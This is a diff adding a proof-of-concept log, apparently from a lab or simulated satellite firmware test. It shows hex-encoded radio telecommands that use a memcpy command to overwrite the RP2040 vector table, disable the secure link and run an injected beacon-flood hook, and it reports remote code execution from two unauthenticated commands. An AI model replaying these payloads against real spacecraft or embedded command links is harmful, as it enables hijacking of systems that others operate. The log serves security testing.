@@ -1,0 +1,50 @@
+[   0.000] ========================================================================
+[   0.000] V-14 MEMCPY primitive -> RP2040 RCE
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x1A via=radio AES  payload=4027011000000000000000000000000000000000000000000000000000000000
+[   0.001] <-- TM apid=0x1A clear len=8
+[   0.001] --> TC apid=0x18 via=radio AES  payload=0020002008ed00e00400
+[   0.001] <-- TM apid=0x18 clear len=8
+[   0.001] <-- TM apid=0x18 clear len=8
+[   0.001] <-- TM apid=0x18 clear len=12
+[   0.001] MEMCPY log_name->0xe000ed08 ack=0101000052434500
+[   0.001] --> TC apid=0x19 via=radio clear payload=08ed00e00400
+[   0.001] <-- TM apid=0x19 clear len=11
+[   0.001] VTOR now 0x10012740 == labFnSecureLinkOff
+[   0.001] --> TC apid=0x1A via=radio clear payload=4026011000000000000000000000000000000000000000000000000000000000
+[   0.001] <-- TM apid=0x1A clear len=8
+[   0.001] --> TC apid=0x18 via=radio clear payload=0020002008ed00e00400
+[   0.001] <-- TM apid=0x18 clear len=8
+[   0.001] <-- TM apid=0x18 clear len=8
+[   0.001] <-- TM apid=0x18 clear len=8
+[   0.001] <-- TM apid=0x18 clear len=8
+[   0.001] <-- TM apid=0x18 clear len=12
+[   0.001] --> advance(1200 ms)
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] --> advance(1000 ms)
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] after second hook: 10 beacons in 1 s -> flood hook ran
+[   0.002] => 2 unauthenticated TCs = arbitrary mission-code execution
+[   0.002] ========================================================================
+[   0.002] POC OK
+[   0.002] ========================================================================
